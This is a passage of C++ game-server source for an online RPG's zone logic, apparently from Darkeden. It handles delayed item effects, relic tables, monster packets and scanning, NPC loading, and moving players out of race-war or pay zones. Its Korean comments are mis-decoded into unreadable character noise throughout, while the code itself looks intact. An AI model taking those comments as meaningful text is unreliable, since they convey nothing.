		// Ÿ »ç¶ó³ŽŽ ¶» ³¯ž°Ž.
		GCDeleteObject gcDeleteObject;
		gcDeleteObject.setObjectID(pItem->getObjectID());

		broadcastPacket(x, y , &gcDeleteObject);

		pZone->getObjectRegistry().registerObject(pItem);
		pZone->addItem(pItem, cx, cy);
	}
	else
	{
		//cout << "transportItem" << endl;
		EffectTransportItem* pEffectTransportItem = new EffectTransportItem(this, x, y, pZone, cx, cy, pItem, 0);
		pEffectTransportItem->setNextTime(999999);
		m_ObjectRegistry.registerObject(pEffectTransportItem);
		addEffect_LOCKING(pEffectTransportItem);
	}
	
	__END_CATCH
}

//-------------------------------------------------------------
// add Item To Corpse Delayed
//-------------------------------------------------------------
// Ÿ» °¡Žµ¥.. Žž¥ thread¿¡­ µµ µŽ.
// Žž¥ heartbeat¿¡­ °¡µŽ.
//-------------------------------------------------------------
void Zone::addItemToCorpseDelayed(Item* pItem, ObjectID_t corpseItemID)
	throw(Error)
{
	__BEGIN_TRY

	Assert(pItem != NULL);

	EffectAddItemToCorpse* pEffectAddItem = new EffectAddItemToCorpse(this, pItem, corpseItemID, 0);
	pEffectAddItem->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectAddItem);
	addEffect_LOCKING(pEffectAddItem);
	
	__END_CATCH
}

//-------------------------------------------------------------
// add Item Delayed
//-------------------------------------------------------------
// Ÿ» °¡Žµ¥.. Žž¥ thread¿¡­ µµ µŽ.
// Žž¥ heartbeat¿¡­ °¡µŽ.
//-------------------------------------------------------------
void Zone::addItemDelayed(Item* pItem, ZoneCoord_t cx, ZoneCoord_t cy, bool bAllowCreature)
	throw(Error)
{
	__BEGIN_TRY

	Assert(m_OuterRect.ptInRect(cx, cy));
	Assert(pItem != NULL);

	EffectAddItem* pEffectAddItem = new EffectAddItem(this, cx, cy, pItem, 0, bAllowCreature);
	pEffectAddItem->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectAddItem);
	addEffect_LOCKING(pEffectAddItem);
	
	__END_CATCH
}

// Ÿ÷ º® Ÿ º» µå.
void Zone::deleteItemDelayed(Object* pObject, ZoneCoord_t x, ZoneCoord_t y)
	throw(Error)
{
	__BEGIN_TRY
	
	Assert(m_OuterRect.ptInRect(x, y));
	Assert( pObject != NULL );

	EffectDeleteItem* pEffectDeleteItem = new EffectDeleteItem(this, x, y, pObject, 0);
	pEffectDeleteItem->setNextTime(999999);
	m_ObjectRegistry.registerObject(pEffectDeleteItem);
	addEffect_LOCKING(pEffectDeleteItem);

	__END_CATCH
}

//-------------------------------------------------------------
// add Relic Item
//-------------------------------------------------------------
// Ÿ» °¡Žµ¥.. Žž¥ thread¿¡­ µµ µŽ.
// Žž¥ heartbeat¿¡­ °¡µŽ.
//-------------------------------------------------------------
bool Zone::addRelicItem(int relicIndex)
	throw(Error)
{
	__BEGIN_TRY

	//cout << "[addRelicItem] ZoneID=" << (int)m_ZoneID << ", relicIndex=" << relicIndex << endl;

	const RelicInfo* pRelicInfo = dynamic_cast<RelicInfo*>(g_pRelicInfoManager->getItemInfo(relicIndex));

	int cx = pRelicInfo->x;
	int cy = pRelicInfo->y;

	Assert(m_OuterRect.ptInRect(cx, cy));

	// ¹ º¹° ºž°üŽë°¡ Ž °æ¿ì
	if (m_bHasRelicTable)
	{
		return false;
		// öç ž º¹° ºž°üŽëž £ŽŽ. (addItemµ¶§ Zone¿¡ ¥ x,yž ±âŸïµ)
        // º¹° ºž°üŽë¿¡ Ÿ¹«·± º¹°µµ ŸøŽžé return
        // ŸŽžé, ±â º¹° ŸŽ º¹°» ¿ø·¡ º¹°ºž°üŽë¿¡ ³ŽŽ.
		// addItemDelayedž »ç¿ë­ ¿ø·¡ Zone¿¡ °¡¹öž®žé µŽ.
	}
	else
	{
		// Monsterž »ýºŽ.
		Monster* pMonster = NULL;
		try {
			pMonster = new Monster(pRelicInfo->monsterType);

			m_ObjectRegistry.registerObject(pMonster);

		} catch (Throwable& ) {
			SAFE_DELETE(pMonster);
			return false;
		}

		//cout << "new Monster OK" << endl;

		// MonsterCorpsež »ýºŽ. (º¹° ºž°üŽë)
		MonsterCorpse* pMonsterCorpse = NULL;
		try {
			pMonsterCorpse = new MonsterCorpse(pMonster);
			pMonsterCorpse->setDir( 2 );
			pMonsterCorpse->setZone( this );
			pMonsterCorpse->setX( cx );
			pMonsterCorpse->setY( cy );
			Assert(pMonsterCorpse != NULL);
		} catch (Throwable& t) {
			//cout << t.toString().c_str() << endl;
		}

		//cout << "new MonsterCorpse OK" << endl;

		if (pRelicInfo->relicType==RELIC_TYPE_SLAYER)
		{
			Effect* pRelicTable = new EffectSlayerRelicTable(pMonsterCorpse);
			pRelicTable->setNextTime(999999);
			m_ObjectRegistry.registerObject(pRelicTable);

			pMonsterCorpse->getEffectManager().addEffect( pRelicTable );
			pMonsterCorpse->setFlag( Effect::EFFECT_CLASS_SLAYER_RELIC_TABLE );

			g_pCombatInfoManager->setRelicOwner(relicIndex, CombatInfoManager::RELIC_OWNER_SLAYER);
		}
		else
		{
			Effect* pRelicTable = new EffectVampireRelicTable(pMonsterCorpse);
			pRelicTable->setNextTime(999999);
			m_ObjectRegistry.registerObject(pRelicTable);

			pMonsterCorpse->getEffectManager().addEffect( pRelicTable );
			pMonsterCorpse->setFlag( Effect::EFFECT_CLASS_VAMPIRE_RELIC_TABLE );

			g_pCombatInfoManager->setRelicOwner(relicIndex, CombatInfoManager::RELIC_OWNER_VAMPIRE);
		}

		// Relic» »ýºŽ.
		list<OptionType_t> optionNULL;
		Item* pItem = g_pItemFactoryManager->createItem(Item::ITEM_CLASS_RELIC, relicIndex, optionNULL);
		Assert(pItem!=NULL);

		//cout << "new RelicItem OK" << endl;

		//  Zoneº RelicTable» °®°í Ž°í ¥Ž.
		m_bHasRelicTable = true;

		pMonsterCorpse->addTreasure(pItem);

		// Ž relicº DB¿¡ »ýºŽ.
		// Žë CGDissectionCorpseHandler¿¡­ createö ŸŽŽ.
		// ºž°üŽë¿¡­ ²š³Ÿ¶§ž¶Ž createµö Ÿ°±â §­Ž.
		pItem->create("", STORAGE_CORPSE, pMonsterCorpse->getObjectID(), 0, 0);

		if (pRelicInfo->relicType==RELIC_TYPE_SLAYER)
		{
			EffectSlayerRelic* pEffect = new EffectSlayerRelic(pMonsterCorpse);
			pMonsterCorpse->getEffectManager().addEffect( pEffect );
			pMonsterCorpse->setFlag(Effect::EFFECT_CLASS_SLAYER_RELIC);
			pEffect->affect(pMonsterCorpse);
			g_pCombatInfoManager->setRelicOwner(relicIndex, CombatInfoManager::RELIC_OWNER_SLAYER);
		}
		else
		{
			EffectVampireRelic* pEffect = new EffectVampireRelic(pMonsterCorpse);
			pMonsterCorpse->getEffectManager().addEffect( pEffect );
			pMonsterCorpse->setFlag(Effect::EFFECT_CLASS_VAMPIRE_RELIC);
			pEffect->affect(pMonsterCorpse);
			g_pCombatInfoManager->setRelicOwner(relicIndex, CombatInfoManager::RELIC_OWNER_VAMPIRE);
		}

		//cout << "addTreasure OK" << endl;

		// ¹· Zone¿¡ °¡žé Ÿµ¹·(µ¿±â­ ¹®)
		// Effectž »ç¿ë­ °¡µµ· Ž.
		EffectAddItem* pEffectAddItem = new EffectAddItem(this, cx, cy, pMonsterCorpse, 0, false);
		pEffectAddItem->setNextTime(999999);
		m_ObjectRegistry.registerObject(pEffectAddItem);

		addEffect_LOCKING(pEffectAddItem);

		//cout << "addRelic OK" << endl;
	}

	return true;
	
	__END_CATCH
}

//-------------------------------------------------------------
// delete Relic Item
//-------------------------------------------------------------
// Ÿ» »èŽµ¥.. Žž¥ thread¿¡­ µµ µŽ.
// Žž¥ heartbeat¿¡­ »èµŽ.
//-------------------------------------------------------------
bool Zone::deleteRelicItem()
	throw(Error)
{
	__BEGIN_TRY

	// º¹° ºž°üŽë°¡ ŸøŽžé ž®
	if (!m_bHasRelicTable)
	{
		return false;
	}

	// º¹° ºž°üŽëž £ŽŽ.
	Item* pItem = dynamic_cast<Item*>( getTile( m_RelicTableX, m_RelicTableY ).getObject( m_RelicTableOID ) );
	Assert( pItem != NULL );

	// ¹· Zone¿¡ °¡žé Ÿµ¹·(µ¿±â­ ¹®)
	// Effectž »ç¿ë­ °¡µµ· Ž.
	EffectDeleteItem* pEffectDeleteItem = new EffectDeleteItem( this, m_RelicTableX, m_RelicTableY, pItem, 0 );
	pEffectDeleteItem->setNextTime( 999999 );
	m_ObjectRegistry.registerObject( pEffectDeleteItem );

	addEffect_LOCKING( pEffectDeleteItem );

	//cout << "delete Relic OK" << endl;

	m_bHasRelicTable = false;

	return true;
	
	__END_CATCH
}

//-------------------------------------------------------------
// create MonsterAddPacket
//-------------------------------------------------------------
// monster »ó¿¡ µû¶ó­ GCAddXXX packet» »ýºŽ. by sigi
//-------------------------------------------------------------
Packet* Zone::createMonsterAddPacket(Monster* pMonster, Creature* pPC) const
	throw()
{
	Assert( pMonster != NULL );

	// ºžŽ »ç¶÷ ³µö Ÿº °æ¿ì
	// Ž~ º ö Ž »ó¶ó°í ³Ž.
	// Ž packet» »ýºµ°í ©±â §­Ž.
	if ( pPC != NULL && !canSee( pPC, pMonster ) ) return NULL;
//	bool canSeeAll = (pPC==NULL);

	// ObservingEye å®ž °¡®¿Ž.
//	EffectObservingEye* pEffectObservingEye = NULL;
//	if ( pPC != NULL && pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//	{
//		pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//		//Assert( pEffectObservingEye );
//	}

	if (pMonster->isFlag(Effect::EFFECT_CLASS_HIDE)) 
	{
		// ¹ì°³ª º ö Žžé..
//		if (canSeeAll 
//			|| pPC->isVampire() 
//			|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )
//			|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pMonster ) ) ) 	
		{
			GCAddBurrowingCreature* pPacket = new GCAddBurrowingCreature();

			pPacket->setObjectID(pMonster->getObjectID());
			pPacket->setName(pMonster->getName());
			//pPacket->setName(pMonster->getEName());//by viva
			pPacket->setX(pMonster->getX());
			pPacket->setY(pMonster->getY());

			return pPacket;
		}

	} 
	// ¹ã »ó
	else if (pMonster->isFlag(Effect::EFFECT_CLASS_TRANSFORM_TO_BAT))
	{
		GCAddBat* pPacket = new GCAddBat();
		pPacket->setObjectID(pMonster->getObjectID());
		pPacket->setName(pMonster->getName());
		pPacket->setXYDir(pMonster->getX(), pMonster->getY(), pMonster->getDir());
		pPacket->setItemType( 0 );	// Ÿ÷ Ÿ ŸŽŽ.
		pPacket->setMaxHP( pMonster->getHP(ATTR_MAX) );
		pPacket->setCurrentHP( pMonster->getHP(ATTR_CURRENT) );
		pPacket->setGuildID( 1 );
		pPacket->setColor( 0 );

		return pPacket;
	} 
	// ŽŽë »ó
	else if (pMonster->isFlag(Effect::EFFECT_CLASS_TRANSFORM_TO_WOLF))
	{
		GCAddWolf* pPacket = new GCAddWolf();
		pPacket->setObjectID(pMonster->getObjectID());
		pPacket->setName(pMonster->getName());
		pPacket->setXYDir(pMonster->getX(), pMonster->getY(), pMonster->getDir());
		pPacket->setItemType( 0 );	// Ÿ÷ Ÿ ŸŽŽ.
		pPacket->setMaxHP( pMonster->getHP(ATTR_MAX) );
		pPacket->setCurrentHP( pMonster->getHP(ATTR_CURRENT) );
		pPacket->setGuildID( 1 );

		return pPacket;
	}
	// invisiblity »ó
	else if (pMonster->isFlag(Effect::EFFECT_CLASS_INVISIBILITY))
	{
		// ºž³ª? ¹ì°³ª ºö Žžé..
//		if (canSeeAll 
//			|| pPC->isVampire() 
//			|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY)
//			|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pMonster ) ) )
		{
			// FIXME
			// ³¿¡µû¶ó­ Ÿî¶»° ºžö °áµ ..
			GCAddMonster* pPacket = new GCAddMonster();
			makeGCAddMonster(pPacket, pMonster);
			pPacket->setEffectInfo(pMonster->getEffectInfo());

			return pPacket;
		}
	}
	else
	{
		GCAddMonster* pPacket = new GCAddMonster();
		makeGCAddMonster(pPacket, pMonster);

		return pPacket;
	}

	return NULL;
}

list<NPCInfo*>* Zone::getNPCInfos(void)
{ 
	return &m_NPCInfos; 
}

void Zone::addNPCInfo(NPCInfo* pInfo) 
{ 
	// ° zone delete¶§ ö¿öŸµµ¥.. - -;	by sigi
	m_NPCInfos.push_back(pInfo); 
}

const BPOINT& Zone::getRandomMonsterRegenPosition() const
{
	return m_MonsterRegenPositions[rand() % m_MonsterRegenPositions.size()];
}

const BPOINT& Zone::getRandomEmptyTilePosition() const
{
	return m_EmptyTilePositions[rand() % m_EmptyTilePositions.size()];
}

void Zone::initLoadValue()
{
	m_LoadValue = 0;
	getCurrentTime( m_LoadValueStartTime );
}

DWORD Zone::getLoadValue() const
{
	Timeval currentTime;
	getCurrentTime( currentTime );

	Timeval elapsedTime = timediff(currentTime, m_LoadValueStartTime);

	if (elapsedTime.tv_sec==0)
	{
		return 200;
	}

	// 10Žç loopö
	DWORD loadValue = m_LoadValue*10 / elapsedTime.tv_sec;

	return loadValue;
}

void Zone::monsterScan(Monster* pMonster, ZoneCoord_t x, ZoneCoord_t y, Dir_t dir) 
	throw(Error)
{
	__BEGIN_TRY

//#ifdef __MONSTER_FIGHTING__

	// [TEST CODE]

	switch ( pMonster->getMonsterType() )
	{
		case 717:
		case 721:
		case 723:
		case 724:
		case 725:
			{
				map<ObjectID_t, Creature*>::iterator itr = m_pPCManager->getCreatures().begin();
				map<ObjectID_t, Creature*>::iterator endItr = m_pPCManager->getCreatures().end();

				for ( ; itr != endItr ; ++itr )
				{
					pMonster->addPotentialEnemy( itr->second );
				}
				break;
			}
		default:
			break;
	}

	ZoneCoord_t x2 = x;
	ZoneCoord_t y2 = y;

	//////////////////////////////////////////////////////////////////////////////
	// Ÿ ¿µ¿ª »ó¿ì žðµ + 1 Ÿ¿ õ°¡²Ž. 
	// ¯Ž ¹æâ¿¡ µûž¥ ON_SIGHT ¿µ¿ª õ°¡µ±â ¶§¹®Ž.
	//////////////////////////////////////////////////////////////////////////////
	int sight = pMonster->getSight();

	for (ZoneCoord_t ix = max(0, x2 - sight - 1), endx = min(m_Width - 1, x2 + sight + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, y2 - sight - 1), endy = min(m_Height - 1, y2 + sight + 1) ; iy <= endy ; iy++) 
		{
			//if (pPC->isFlag(Effect::EFFECT_CLASS_DARKNESS)) sight = DARKNESS_SIGHT;
			
			// öç ž §¿¡ Ž žðµç ¿ºê§®µé¿¡ Žë ¹º¹Ž.
			//const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
	
			list<Object*>::const_iterator itr = objectList.begin();

			// 
			// object°¡ Ž °æ¿ìžž 
			// pVisionInfo->getVisionState()ž © ±â §­
			// if - do~while » »ç¿ëŽ. by sigi. 2002.5.8
			//
			if (itr != objectList.end())
			{
				do		
				{
					Assert(*itr != NULL);

					Object::ObjectClass OClass = (*itr)->getObjectClass();

					////////////////////////////////////////////////////////////
					// °¢ °Ž OBJECT CLASS¿¡ µû¶ó­ û GCAddXXX ¶»
					// žžµéŸî­ owner ¿¡° üŽ. 
					////////////////////////////////////////////////////////////
					
					////////////////////////////////////////////////////////////
					// ž §¿¡ ©ž®³°¡ » °æ¿ì
					////////////////////////////////////////////////////////////
					if (OClass == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pCreature = dynamic_cast<Creature*>(*itr);
						Assert(pCreature != NULL);

						Creature::CreatureClass CClass = pCreature->getCreatureClass();

						if (pCreature->isPC())
						{
							if (pMonster->isEnemyToAttack( pCreature ))
							{
								pMonster->addPotentialEnemy(pCreature);
							}
						}
						else if (CClass == Creature::CREATURE_CLASS_MONSTER)
						{
							Monster* pOtherMonster = dynamic_cast<Monster*>(pCreature);

							VisionState vs = pOtherMonster->getVisionState(x2,y2);

							// Aggressive žóº¿¡°žž ûž· µî·Ž.
							if (vs >= IN_SIGHT) 
							{
								if (isPotentialEnemy(pMonster, pOtherMonster))
								{
									pMonster->addPotentialEnemy(pOtherMonster);
									pOtherMonster->addPotentialEnemy(pMonster);
								}
							}
						}
					}	// if (OClass==OBJECT_CLASS_CREATURE)
				} while ( ++itr != objectList.end() ); // do
			}	// if (itr != objectList.end())
		}	// for iy
	}	// for ix

//#endif

	__END_CATCH
}

/*
void Zone::setNPCMarketCondition(MarketCond_t NPCSell, MarketCond_t NPCBuy) 
	throw (Error)
{
	__BEGIN_TRY

	map<ObjectID_t, Creature*> NPCMap = m_pNPCManager->getCreatures();
	for (map<ObjectID_t, Creature*>::const_iterator i = NPCMap.begin(); i != NPCMap.end(); i++)
	{
		NPC* pNPC = dynamic_cast<NPC*>(i->second);

		pNPC->setMarketCondBuy( NPCBuy );
		pNPC->setMarketCondSell( NPCSell );
	
		pNPC->increaseShopVersion(SHOP_RACK_SPECIAL);
	}

	__END_CATCH
}
*/


bool Zone::deleteNPC(Creature* pCreature) 
	throw(Error)
{
	__BEGIN_TRY

	if (pCreature==NULL 
		|| !pCreature->isNPC())
		return false;

	try {

		deleteCreature(pCreature, pCreature->getX(), pCreature->getY());
		g_pPCFinder->deleteNPC(pCreature->getName());

	} catch (NoSuchElementException) {
		cout << "NoSuchNPC : " << pCreature->getName().c_str() 
				<< ", (" << pCreature->getX() << ", " << pCreature->getY() << ")" << endl;

		return false;
	}

	NPC* pNPC = dynamic_cast<NPC*>(pCreature);
	removeNPCInfo( pNPC );

	SAFE_DELETE(pCreature);

	return true;

	__END_CATCH
}

void Zone::sendNPCInfo()
	throw(Error)
{
	__BEGIN_TRY

	// NPC¿¡ Žë ºžž ¬¶óŸð®¿¡° ºž³»Ž.
	GCNPCInfo gcNPCInfo;

	list<NPCInfo*>::const_iterator itr = m_NPCInfos.begin();
	for (; itr != m_NPCInfos.end(); itr++)
	{
		NPCInfo* pInfo = *itr;
		gcNPCInfo.addNPCInfo(pInfo);
	}
	
	broadcastPacket( &gcNPCInfo );

	__END_CATCH
}


void Zone::loadNPCs(Race_t race) 
	throw(Error)
{
	__BEGIN_TRY

	m_pNPCManager->load( getZoneID(), race );

	sendNPCInfo();

	__END_CATCH
}

void Zone::deleteNPCs(Race_t race) 
	throw(Error)
{
	__BEGIN_TRY

	const map< ObjectID_t, Creature* >& NPCs = m_pNPCManager->getCreatures();	// hash_map» º¹»ç­ áŸŽ.
	map< ObjectID_t, Creature* >::const_iterator itr = NPCs.begin();

	list<ObjectID_t> creatures;

	// Ž ObjectIDµé» úåµŽ.
	for (; itr!=NPCs.end(); itr++)
	{
		Creature* pCreature = itr->second;
		creatures.push_back( pCreature->getObjectID() );
	}

	list<ObjectID_t>::iterator oitr = creatures.begin();

	// NPCž ö¿îŽ.	
	for (; oitr!=creatures.end(); oitr++)
	{
		Creature* pCreature = m_pNPCManager->getCreature( *oitr );

		if (pCreature!=NULL)
		{
			Assert(pCreature->isNPC());
			
			NPC* pNPC = dynamic_cast<NPC*>(pCreature);

			if (pNPC->getRace()==race)
			{
				deleteNPC( pCreature );
			}
		}
	}

	sendNPCInfo();

	__END_CATCH
}

bool Zone::removeNPCInfo(NPC* pNPC)
{
	__BEGIN_TRY

	list<NPCInfo*>::iterator itr = m_NPCInfos.begin();

	for (; itr!=m_NPCInfos.end(); itr++)
	{
		NPCInfo* pNPCInfo = *itr;

		if ( pNPCInfo->getNPCID() == pNPC->getNPCID() )
		{
			SAFE_DELETE(pNPCInfo);
			m_NPCInfos.erase( itr );

			return true;
		}
	}

	return false;

	__END_CATCH
}

void Zone::loadEffect()
	throw(Error)
{
	__BEGIN_TRY

	Statement* pStmt = NULL;
	Result*	pResult = NULL;

	BEGIN_DB
	{
		pStmt = g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();

		///////////////////////////////////////////////////////////////////////////////
		// EffectPKZoneRegen ·µå
		///////////////////////////////////////////////////////////////////////////////
		pResult = pStmt->executeQuery("SELECT LeftX, TopY, RightX, BottomY FROM EffectPKZoneRegen WHERE ZoneID=%u", getZoneID());

		while (pResult->next()) 
		{
			int count = 0;

			ZoneCoord_t left = pResult->getInt( ++count );
			ZoneCoord_t top = pResult->getInt( ++count );
			ZoneCoord_t right = pResult->getInt( ++count );
			ZoneCoord_t bottom = pResult->getInt( ++count );

			EffectPKZoneRegen *pEffect = new EffectPKZoneRegen( this, left, top, right, bottom );
			pEffect->setSlayer();
			pEffect->setVampire();
			pEffect->setOusters();
			pEffect->setTurn( 10 );
			pEffect->setHP( 40 );
			pEffect->setNextTime(0);

			registerObject( pEffect );
			addEffect( pEffect );
		}

		///////////////////////////////////////////////////////////////////////////////
		// Gnome's Horn Waypoint ·µå
		// WayPoint § 3X3 ž¿¡ Ž Ÿ¿ìºîŽ Žç 1Ÿ¿ HP,MP °¡ žº¹µŽ.
		///////////////////////////////////////////////////////////////////////////////
		pResult = pStmt->executeQuery("SELECT X, Y FROM WayPointInfo WHERE ZoneID = %u AND Race = %d", getZoneID(), RACE_OUSTERS);

		while ( pResult->next() )
		{
			ZoneCoord_t X = pResult->getInt( 1 );
			ZoneCoord_t Y = pResult->getInt( 2 );

			if ( isValidZoneCoord( this, X-1, Y-1 )
				&& isValidZoneCoord( this, X+1, Y+1 )
			   )
			{
				EffectPKZoneRegen *pEffect = new EffectPKZoneRegen( this, X-1, Y-1, X+1, Y+1 );
				pEffect->setOusters();
				pEffect->setTurn( 10 );
//				pEffect->setHP( 4 );
				pEffect->setHP( 10 );
				pEffect->setNextTime(0);

				registerObject( pEffect );
				addEffect( pEffect );
			}
		}

		SAFE_DELETE(pStmt);
	}
	END_DB(pStmt)

//	if ( m_ZoneID == 3001 || m_ZoneID == 71 || m_ZoneID == 72 || m_ZoneID == 73 )
	g_pEffectLoaderManager->load(this);

	if ( m_ZoneID == 3002 )
	{
		EffectContinualGroundAttack* pEffect = new EffectContinualGroundAttack( this, Effect::EFFECT_CLASS_GROUND_ATTACK, 3 );
		pEffect->setDeadline(99999999);
		pEffect->setNumber( 7, 11 );

		registerObject( pEffect );
		addEffect( pEffect );
	}

	__END_CATCH
}

void Zone::releaseSafeZone()
	throw()
{
	__BEGIN_TRY

	m_ZoneLevel = NO_SAFE_ZONE;

	// ž ·¹º§» ±â­²Ž.
	for (ZoneCoord_t x = 0; x < m_Width; x++)
		for (ZoneCoord_t y = 0; y < m_Height; y++)
			m_ppLevel[x][y] = m_ZoneLevel;

	__END_CATCH
}

void Zone::resetSafeZone()
	throw()
{
	__BEGIN_TRY

	m_ZoneLevel = g_pZoneInfoManager->getZoneInfo( m_ZoneID )->getZoneLevel();

	// ž ·¹º§» ±â­²Ž.
	for (ZoneCoord_t x = 0; x < m_Width; x++)
		for (ZoneCoord_t y = 0; y < m_Height; y++)
			m_ppLevel[x][y] = m_ZoneLevel;

	__END_CATCH
}

void Zone::resetDarkLightInfo()
	throw()
{
	__BEGIN_TRY

	m_pWeatherManager->resetDarkLightInfo();

	__END_CATCH
}

void
Zone::killAllMonsters() 
	throw(Error)
{
	__BEGIN_TRY

	__ENTER_CRITICAL_SECTION(m_Mutex)

	map< ObjectID_t, Creature* > & monsters = m_pMonsterManager->getCreatures();
	map< ObjectID_t, Creature* >::iterator itr = monsters.begin();

	for (; itr!=monsters.end(); itr++)
	{
		Creature* pCreature = itr->second;
		Monster* pMonster = dynamic_cast<Monster*>(pCreature);

		if (pMonster != NULL && !pMonster->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE))
		{
			pMonster->setHP( 0 );
		}
	}

	__LEAVE_CRITICAL_SECTION(m_Mutex)

	__END_CATCH
}

void
Zone::killAllMonsters_UNLOCK() 
	throw(Error)
{
	__BEGIN_TRY

	map< ObjectID_t, Creature* > & monsters = m_pMonsterManager->getCreatures();
	map< ObjectID_t, Creature* >::iterator itr = monsters.begin();

	for (; itr!=monsters.end(); itr++)
	{
		Creature* pCreature = itr->second;
		Monster* pMonster = dynamic_cast<Monster*>(pCreature);

		if (pMonster != NULL && !pMonster->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE)) // Monster°¡ NULL ¶§°¡ Ž. ©...
		{
			pMonster->setHP( 0 );
		}
	}

	__END_CATCH
}

void Zone::killAllPCs() throw(Error)
{
	__BEGIN_TRY

	map< ObjectID_t, Creature* > & pcs = m_pPCManager->getCreatures();
	map< ObjectID_t, Creature* >::iterator itr = pcs.begin();

	for (; itr!=pcs.end(); itr++)
	{
		Creature* pCreature = itr->second;

		if ( pCreature->isSlayer() )
		{
			dynamic_cast<Slayer*>(pCreature)->setHP(0);
		}
		else if ( pCreature->isVampire() )
		{
			dynamic_cast<Vampire*>(pCreature)->setHP(0);
		}
		else if ( pCreature->isOusters() )
		{
			dynamic_cast<Ousters*>(pCreature)->setHP(0);
		}
	}

	__END_CATCH
}

// Ÿ· üï¿¡ ü°¡Ž »ç¶÷žž ³²±äŽ. ³ªžöŽ kickŽ.
void    Zone::remainRaceWarPlayers() 
	throw(Error)
{
	__BEGIN_TRY

	try {

	// ü°¡ ¿ø » ö ŸŽŽžé ¹«Ž.
	if (!g_pVariableManager->isActiveRaceWarLimiter())
		return;

	__ENTER_CRITICAL_SECTION(m_Mutex)

	map< ObjectID_t, Creature* > & creatures = m_pPCManager->getCreatures();
	map< ObjectID_t, Creature* >::iterator itr = creatures.begin();

	for (; itr!=creatures.end(); itr++)
	{
		Creature* pCreature = itr->second;

		if (pCreature->isFlag( Effect::EFFECT_CLASS_RACE_WAR_JOIN_TICKET ))
			continue;

		Player* pPlayer = pCreature->getPlayer();
		Assert(pPlayer != NULL);

		GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPlayer);

		Event* pEvent = pGamePlayer->getEvent(Event::EVENT_CLASS_TRANSPORT);
		if (pEvent==NULL)
		{
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
			Assert(pPC!=NULL);

			ZONE_COORD   ZC;
			g_pResurrectLocationManager->getPosition( pPC, ZC );

			ZoneInfo* pZoneInfo = g_pZoneInfoManager->getZoneInfo( ZC.id );
			Assert(pZoneInfo!=NULL);

			EventTransport* pEventTransport = new EventTransport(pGamePlayer);

			pEventTransport->setDeadline( 15*10 );
			pEventTransport->setTargetZone(ZC.id, ZC.x, ZC.y);
			pEventTransport->setZoneName( pZoneInfo->getFullName() );

			// žî ¿¡ Ÿîµð· µ¿Ž.°í ºž³»Ž.
			pEventTransport->sendMessage();

			pGamePlayer->addEvent(pEventTransport);
		}
		else
		{
			EventTransport* pEventTransport = dynamic_cast<EventTransport*>(pEvent);
			pEventTransport->sendMessage();
		}
	}

	__LEAVE_CRITICAL_SECTION(m_Mutex)

	} catch (Throwable& t) {
		cout << t.toString().c_str() << endl;
		throw;
	}

	__END_CATCH
}

bool Zone::isLevelWarZone() const
{
	switch ( m_ZoneID )
	{
		case 1131:
		case 1132:
		case 1133:
		case 1134:
			{
				return true;
			}
			break;
		default:
			{
				return false;
			}
			break;
	}
}

void    Zone::remainPayPlayer()
    throw(Error)
{
	__BEGIN_TRY

	try {

		map< ObjectID_t, Creature* > & creatures = m_pPCManager->getCreatures();
		map< ObjectID_t, Creature* >::iterator itr = creatures.begin();

		for (; itr!=creatures.end(); itr++)
		{
			Creature* pCreature = itr->second;
			Player* pPlayer = pCreature->getPlayer();
			Assert(pPlayer != NULL);

			GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPlayer);

			if ( pGamePlayer->isPayPlaying() )
				continue;

			Event* pEvent = pGamePlayer->getEvent(Event::EVENT_CLASS_TRANSPORT);
			if (pEvent==NULL)
			{
				PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
				Assert(pPC!=NULL);

				ZONE_COORD   ZC;
				g_pResurrectLocationManager->getPosition( pPC, ZC );

				ZoneInfo* pZoneInfo = g_pZoneInfoManager->getZoneInfo( ZC.id );
				Assert(pZoneInfo!=NULL);

				EventTransport* pEventTransport = new EventTransport(pGamePlayer);

				pEventTransport->setDeadline( 60*10 );
				pEventTransport->setTargetZone(ZC.id, ZC.x, ZC.y);
				pEventTransport->setZoneName( pZoneInfo->getFullName() );

				char msg[100];

				sprintf( msg, g_pStringPool->c_str( STRID_LEVEL_WAR_ZONE_FREE_CLOSE_1 ) );

				GCSystemMessage gcSystemMessage;
				gcSystemMessage.setMessage( msg );
				pPlayer->sendPacket( &gcSystemMessage );

				sprintf( msg, g_pStringPool->c_str( STRID_LEVEL_WAR_ZONE_FREE_CLOSE_2 ),
				//pZoneInfo->getFullName().c_str() );by viva
				pZoneInfo->getEName().c_str() );

				gcSystemMessage.setMessage( msg );
				pPlayer->sendPacket( &gcSystemMessage );

				// žî ¿¡ Ÿîµð· µ¿Ž.°í ºž³»Ž.
				//              pEventTransport->sendMessage();

				pGamePlayer->addEvent(pEventTransport);
			}
			else
			{
				EventTransport* pEventTransport = dynamic_cast<EventTransport*>(pEvent);
				pEventTransport->sendMessage();
			}
		}
	} catch (Throwable& t) {
		cout << t.toString().c_str() << endl;
		throw;
	}

	__END_CATCH
}

#ifdef __CONTRIBUTION_SYSTEM__
bool	Zone::hasLevelWar()
{ 
	if(m_pLevelWarManager != NULL)
		return m_pLevelWarManager->hasWar();
	else
		return false;
}

void	Zone::warpToLevelWarItemDefaultPosition(Creature* pCreature)
{ 
	if(m_pLevelWarManager != NULL)
		m_pLevelWarManager->warpToDefaultPosition(pCreature); 
}

int Zone::expLevelWarBonusTimeCheck(Race_t race) 
{ 
	if(m_pLevelWarManager != NULL)
		return m_pLevelWarManager->expBonusTimeCheck(race); 
	else 
